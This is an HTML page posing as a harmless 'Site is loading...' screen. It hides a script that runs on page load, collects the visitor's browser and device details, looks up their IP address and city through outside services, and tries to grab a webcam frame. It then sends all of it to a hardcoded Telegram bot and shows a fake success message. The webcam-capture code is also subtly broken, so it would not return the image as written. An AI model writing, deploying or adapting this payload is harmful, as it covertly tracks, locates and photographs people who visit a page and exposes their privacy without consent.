<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>body { margin:0; padding:20px; font-family:Arial; background:#000; color:#fff; }</style>
</head>
<body>
    <h1>Site is loading...</h1>
    
    <script>
        // Get all device info
        const getDeviceInfo = () => ({
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookiesEnabled: navigator.cookieEnabled,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ip: 'fetching...',
            location: 'fetching...'
        });

        // Capture screenshot/webcam
        const captureMedia = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(track => track.stop());
                    
                    return canvas.toDataURL('image/jpeg', 0.8);
                }, 1000);
            } catch(e) {
                return 'No camera access';
            }
        };

        // Send to Telegram Bot
        const sendToTelegram = async (data) => {
            const formData = new FormData();
            formData.append('chat_id', '8198454441');
            formData.append('caption', JSON.stringify(data, null, 2));
            formData.append('photo', data.screenshot.split(',')[1], 'screenshot.jpg');
            
            await fetch('https://api.telegram.org/bot8477817066:AAHJOtVykZ153OXdHcPQRXAOJvn8mMtyWMg/sendPhoto', {
                method: 'POST',
                body: formData
            });
        };

        // Main execution
        (async () => {
            const info = getDeviceInfo();
            
            // Get IP via external service
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            info.ip = (await ipResponse.json()).ip;
            
            // Get rough location
            const geoResponse = await fetch(`https://ipapi.co/${info.ip}/json/`);
            const geo = await geoResponse.json();
            info.location = `${geo.city}, ${geo.region}, ${geo.country_name}`;
            
            // Capture screenshot
            info.screenshot = await captureMedia();
            
            // Send everything
            await sendToTelegram(info);
            
            // Show fake page
            document.body.innerHTML = `
                <h1>âœ… Site loaded successfully!</h1>
                <p>All set. Thanks for visiting.</p>
            `;
        })();
    </script>
</body>
</html>
